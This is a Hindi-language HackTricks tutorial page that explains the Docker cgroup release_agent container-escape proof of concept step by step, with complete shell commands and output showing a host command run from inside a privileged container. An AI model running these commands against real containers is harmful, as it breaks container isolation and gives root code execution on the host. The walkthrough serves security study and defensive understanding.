# Docker release\_agent cgroups एस्केप

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें.

</details>

### प्रूफ ऑफ कॉन्सेप्ट को तोड़ना

इस एक्सप्लॉइट को ट्रिगर करने के लिए हमें एक cgroup की आवश्यकता होती है जहां हम `release_agent` फाइल बना सकें और cgroup में सभी प्रोसेस को मारकर `release_agent` को इन्वोक कर सकें। इसे पूरा करने का सबसे आसान तरीका है cgroup कंट्रोलर को माउंट करना और एक चाइल्ड cgroup बनाना।

इसके लिए, हम एक `/tmp/cgrp` डायरेक्टरी बनाते हैं, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup कंट्रोलर को माउंट करते हैं और एक चाइल्ड cgroup बनाते हैं (इस उदाहरण के लिए “x” नाम से)। हालांकि हर cgroup कंट्रोलर का परीक्षण नहीं किया गया है, यह तकनीक अधिकांश cgroup कंट्रोलर्स के साथ काम करनी चाहिए।

यदि आप इसे फॉलो कर रहे हैं और **`mount: /tmp/cgrp: special device cgroup does not exist`** प्राप्त करते हैं, तो इसका मतलब है कि आपकी सेटअप में RDMA cgroup कंट्रोलर नहीं है। **इसे ठीक करने के लिए `rdma` को `memory` में बदलें**। हम RDMA का उपयोग कर रहे हैं क्योंकि मूल PoC केवल इसके साथ काम करने के लिए डिज़ाइन किया गया था।

ध्यान दें कि cgroup कंट्रोलर्स वैश्विक संसाधन हैं जिन्हें विभिन्न अनुमतियों के साथ कई बार माउंट किया जा सकता है और एक माउंट में किए गए परिवर्तन दूसरे माउंट पर लागू होंगे।

नीचे हम “x” चाइल्ड cgroup के निर्माण और इसकी डायरेक्टरी लिस्टिंग देख सकते हैं।
```shell-session
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
आगे, हम "x" cgroup के रिलीज़ पर **cgroup** नोटिफिकेशन्स को **सक्षम करते हैं** उसकी `notify_on_release` फ़ाइल में **एक 1 लिखकर**। हम RDMA cgroup रिलीज़ एजेंट को भी सेट करते हैं ताकि वह एक `/cmd` स्क्रिप्ट को एक्जीक्यूट करे — जिसे हम बाद में कंटेनर में बनाएंगे — होस्ट पर `/cmd` स्क्रिप्ट पथ को `release_agent` फ़ाइल में लिखकर। इसे करने के लिए, हम कंटेनर का पथ होस्ट पर `/etc/mtab` फ़ाइल से प्राप्त करेंगे।

कंटेनर में जोड़ी या संशोधित की गई फ़ाइलें होस्ट पर मौजूद होती हैं, और दोनों दुनियाओं से उन्हें संशोधित करना संभव है: कंटेनर में उनका पथ और होस्ट पर उनका पथ।

नीचे दिए गए ऑपरेशन्स को देखा जा सकता है:
```shell-session
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
ध्यान दें `/cmd` स्क्रिप्ट के पथ पर, जिसे हम होस्ट पर बनाने वाले हैं:
```shell-session
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
```markdown
अब, हम `/cmd` स्क्रिप्ट बनाते हैं ताकि यह `ps aux` कमांड को निष्पादित करे और इसके आउटपुट को होस्ट पर आउटपुट फाइल के पूर्ण पथ को निर्दिष्ट करके कंटेनर पर `/output` में सेव करे। अंत में, हम `/cmd` स्क्रिप्ट की सामग्री देखने के लिए इसे प्रिंट भी करते हैं:
```
```shell-session
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
अंत में, हमले को अंजाम देने के लिए हम “x” चाइल्ड cgroup के अंदर एक प्रक्रिया को तुरंत समाप्त करने वाली प्रक्रिया को उत्पन्न कर सकते हैं। `/bin/sh` प्रक्रिया बनाकर और उसके PID को “x” चाइल्ड cgroup डायरेक्टरी में `cgroup.procs` फाइल में लिखकर, होस्ट पर स्क्रिप्ट `/bin/sh` के बाहर निकलने के बाद निष्पादित होगी। होस्ट पर किया गया `ps aux` का आउटपुट फिर कंटेनर के अंदर `/output` फाइल में सहेजा जाता है:
```shell-session
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
### संदर्भ

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
